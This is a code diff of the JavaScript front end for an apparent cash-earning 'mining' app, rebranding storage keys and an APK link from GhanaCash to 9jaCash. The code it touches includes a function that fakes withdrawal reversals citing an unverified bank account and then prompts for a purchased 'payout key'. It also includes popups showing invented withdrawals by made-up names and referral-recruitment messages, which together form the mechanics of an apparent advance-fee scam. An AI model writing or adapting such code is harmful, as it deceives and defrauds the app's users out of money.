@@ -16,7 +16,7 @@ function formatExternalLink(url, defaultUrl) {
 }
 
 let isBouncing = false;
-try { userData = JSON.parse(localStorage.getItem("GhanaCashUser")); } catch (e) { userData = null; }
+try { userData = JSON.parse(localStorage.getItem("9jaCashUser")); } catch (e) { userData = null; }
 const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:') ? 'http://localhost:3000' : '';
 if (!userData) { window.location.href = "login.html"; }
 
@@ -81,7 +81,7 @@ function setupRealtimeListener() {
         balance = parseFloat(liveData.balance);
       }
 
-      localStorage.setItem("GhanaCashUser", JSON.stringify(userData));
+      localStorage.setItem("9jaCashUser", JSON.stringify(userData));
       localStorage.setItem("walletBalance", balance);
 
       if (liveData.streak !== undefined) checkinData.streak = liveData.streak;
@@ -104,7 +104,7 @@ function setupRealtimeListener() {
 
 // REAL-TIME SAVE TO FIREBASE & LOCAL STORAGE
 function saveUserData(updatedFields = {}) {
-  localStorage.setItem("GhanaCashUser", JSON.stringify(userData));
+  localStorage.setItem("9jaCashUser", JSON.stringify(userData));
   localStorage.setItem("walletBalance", balance);
   updateBalance();
 
@@ -145,12 +145,12 @@ function saveUserData(updatedFields = {}) {
 // Social popup handles come from Firestore settings/payment (telegramLink, whatsappLink)
 let paymentHandles = { telegram: "", whatsapp: "" };
 try {
-  const cachedPayment = JSON.parse(localStorage.getItem("GhanaCashAdminConfig"));
+  const cachedPayment = JSON.parse(localStorage.getItem("9jaCashAdminConfig"));
   if (cachedPayment) paymentHandles = { telegram: cachedPayment.telegramLink || "", whatsapp: cachedPayment.whatsappLink || "" };
 } catch (e) { }
 
 function loadTelegramConfig() {
-  const stored = localStorage.getItem("GhanaCashAdminConfig");
+  const stored = localStorage.getItem("9jaCashAdminConfig");
   if (stored) { try { const config = JSON.parse(stored); if (config.telegramLink) telegramLink = config.telegramLink; } catch (e) { } }
   if (db) {
     db.collection("settings").doc("payment").onSnapshot(function (doc) {
@@ -158,7 +158,7 @@ function loadTelegramConfig() {
         const d = doc.data() || {};
         if (d.telegramLink) telegramLink = d.telegramLink;
         paymentHandles = { telegram: d.telegramLink || "", whatsapp: d.whatsappLink || "" };
-        localStorage.setItem("GhanaCashAdminConfig", JSON.stringify({ telegramLink: telegramLink, whatsappLink: paymentHandles.whatsapp }));
+        localStorage.setItem("9jaCashAdminConfig", JSON.stringify({ telegramLink: telegramLink, whatsappLink: paymentHandles.whatsapp }));
         updateTelegramLink();
         // If the popup is already visible, refresh its link
         const p = document.getElementById("socialJoinPopup");
@@ -175,17 +175,17 @@ function updateTelegramLink() {
 }
 
 function initDarkMode() {
-  const isDark = localStorage.getItem("GhanaCashDark") === "true";
+  const isDark = localStorage.getItem("9jaCashDark") === "true";
   if (isDark) document.body.classList.add("dark-mode");
 }
 
 function toggleDarkMode() {
   const isDark = document.body.classList.toggle("dark-mode");
-  localStorage.setItem("GhanaCashDark", isDark);
+  localStorage.setItem("9jaCashDark", isDark);
 }
 
 function initTutorial() {
-  if (localStorage.getItem("GhanaCashTutorialDone") === "true") return;
+  if (localStorage.getItem("9jaCashTutorialDone") === "true") return;
   setTimeout(function () { startTutorial(); }, 1500);
 }
 
@@ -259,7 +259,7 @@ function finishTutorial() {
   if (skipBtn) skipBtn.classList.remove("show");
   const startBtn = document.getElementById("startTourBtn");
   if (startBtn) startBtn.style.display = "flex";
-  localStorage.setItem("GhanaCashTutorialDone", "true");
+  localStorage.setItem("9jaCashTutorialDone", "true");
   showToast("Tour complete! Start earning!");
 }
 
@@ -282,7 +282,7 @@ function executeBounce() {
     addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
     sendBounceNotification(amount);
 
-    localStorage.setItem("GhanaCashBouncedWithdrawal", "true");
+    localStorage.setItem("9jaCashBouncedWithdrawal", "true");
     checkAndShowVerifyButton();
 
     if (typeof Swal !== 'undefined') {
@@ -359,8 +359,8 @@ function renderUserInfo() {
   const avatarEl = document.getElementById("userAvatar");
   const greetingEl = document.getElementById("greeting");
 
-  if (nameEl) nameEl.textContent = userData.name || userData.phone || "GhanaCash User";
-  if (avatarEl) avatarEl.textContent = (userData.name || userData.phone || "9").charAt(0).toUpperCase();
+  if (nameEl) nameEl.textContent = userData.name || userData.phone || "Ghana Cash User";
+  if (avatarEl) avatarEl.textContent = (userData.name || userData.phone || "G").charAt(0).toUpperCase();
 
   const hrs = new Date().getHours();
   let greet = "Good morning";
@@ -570,7 +570,7 @@ function renderBankInfo() {
 function checkAndShowVerifyButton() {
   const wrap = document.getElementById("verifyBankWrap");
   if (!wrap) return;
-  const isBounced = localStorage.getItem("GhanaCashBouncedWithdrawal") === "true";
+  const isBounced = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
   const hasPayoutKey = userData && userData.payoutKeyPurchased === true;
   const isVerified = userData && (userData.is_verified === 1 || userData.is_verified === true || userData.isVerified === true);
 
@@ -615,7 +615,7 @@ function initReferrals() {
   if (countEl) countEl.textContent = userData.referralsCount || userData.referrals || 0;
   if (earnEl) earnEl.textContent = formatMoney(userData.referralEarnings || 0);
 
-  const msg = encodeURIComponent("Join me on GhanaCash to earn daily cash! Register here: " + baseUrl);
+  const msg = encodeURIComponent("Join me on Ghana Cash to earn daily cash! Register here: " + baseUrl);
   const shareTg = document.getElementById("shareTelegram");
   if (shareTg) shareTg.href = "https://t.me/share/url?url=" + encodeURIComponent(baseUrl) + "&text=" + msg;
   const shareWa = document.getElementById("shareWhatsApp");
@@ -633,7 +633,7 @@ function copyReferralLink() {
 function copyReferralMessage() {
   const input = document.getElementById("referralLinkInput");
   const code = userData ? (userData.referralCode || userData.phone || "GHANACASH") : "GHANACASH";
-  const msg = "Join GhanaCash today & earn daily cash!\nUse referral code: " + code + "\nLink: " + (input ? input.value : "");
+  const msg = "Join Ghana Cash today & earn daily cash!\nUse referral code: " + code + "\nLink: " + (input ? input.value : "");
   navigator.clipboard.writeText(msg).then(() => showToast("Referral details copied!"));
 }
 
@@ -688,7 +688,7 @@ function renderActivities() {
 function logout() {
   if (confirm("Are you sure you want to log out?")) {
     if (realtimeUnsubscribe) realtimeUnsubscribe();
-    localStorage.removeItem("GhanaCashUser");
+    localStorage.removeItem("9jaCashUser");
     localStorage.removeItem("walletBalance");
     window.location.href = "login.html";
   }
@@ -724,7 +724,7 @@ function dismissDownloadPrompt() {
   if (banner) banner.classList.remove("show");
 }
 
-const APK_URL = "https://raw.githubusercontent.com/Xantech007/GhanaCashMine/main/GhanaCash.apk";
+const APK_URL = "https://raw.githubusercontent.com/Xantech007/9jaCashMine/main/9jaCash.apk";
 
 function downloadAppAPK() {
   showToast("Downloading APK...");
@@ -736,7 +736,7 @@ function downloadAppAPK() {
 // ---- Customer Care modal: handles come from Firestore settings/redirects ----
 let socialHandles = { telegram: "", whatsapp: "" };
 try {
-  const cached = JSON.parse(localStorage.getItem("GhanaCashSocialHandles"));
+  const cached = JSON.parse(localStorage.getItem("9jaCashSocialHandles"));
   if (cached) socialHandles = { telegram: cached.telegram || "", whatsapp: cached.whatsapp || "" };
 } catch (e) { }
 
@@ -761,7 +761,7 @@ function updateCustomerCareLinks() {
   const waUrl = buildWhatsappUrl(socialHandles.whatsapp);
   if (tg && tgUrl) tg.href = tgUrl;
   if (wa && waUrl) {
-    wa.href = waUrl + (waUrl.indexOf("?") === -1 ? "?text=" + encodeURIComponent("Hello GhanaCash Support, I need assistance") : "");
+    wa.href = waUrl + (waUrl.indexOf("?") === -1 ? "?text=" + encodeURIComponent("Hello Ghana Cash Support, I need assistance") : "");
   }
 }
 
@@ -774,7 +774,7 @@ function loadSocialHandles() {
       telegram: d.failedSupportHandle || "",
       whatsapp: d.whatsappHandle || ""
     };
-    try { localStorage.setItem("GhanaCashSocialHandles", JSON.stringify(socialHandles)); } catch (e) { }
+    try { localStorage.setItem("9jaCashSocialHandles", JSON.stringify(socialHandles)); } catch (e) { }
     updateCustomerCareLinks();
   }, function (err) { });
 }
@@ -832,9 +832,9 @@ function dismissSocialPopup() {
 function initSocialPopup() {
   // Alternate platform each page load
   let last = "whatsapp";
-  try { last = localStorage.getItem("GhanaCashLastSocial") || "whatsapp"; } catch (e) { }
+  try { last = localStorage.getItem("9jaCashLastSocial") || "whatsapp"; } catch (e) { }
   window.__socialPlatform = last === "telegram" ? "whatsapp" : "telegram";
-  try { localStorage.setItem("GhanaCashLastSocial", window.__socialPlatform); } catch (e) { }
+  try { localStorage.setItem("9jaCashLastSocial", window.__socialPlatform); } catch (e) { }
 
   updateCustomerCareLinks(); // apply cached handles immediately
   loadSocialHandles();
@@ -843,7 +843,7 @@ function initSocialPopup() {
 }
 
 function startLiveWithdrawalPopups() {
-  const users = ["Kwame B.", "Kofi O.", "Ama Y.", "Yaw P.", "Akosua K."];
+  const users = ["Kofi A.", "Kwame O.", "Ama Y.", "Yaw P.", "Akosua K."];
   const amounts = [125, 208.33, 250, 416.67, 166.67];
 
   setInterval(() => {
@@ -890,7 +890,7 @@ document.addEventListener("DOMContentLoaded", function () {
 let userNotifications = [
   {
     id: 1,
-    title: "Welcome to GhanaCash!",
+    title: "Welcome to Ghana Cash!",
     desc: "Start mining daily to earn rewards and build up your balance.",
     time: "2 mins ago",
     read: false
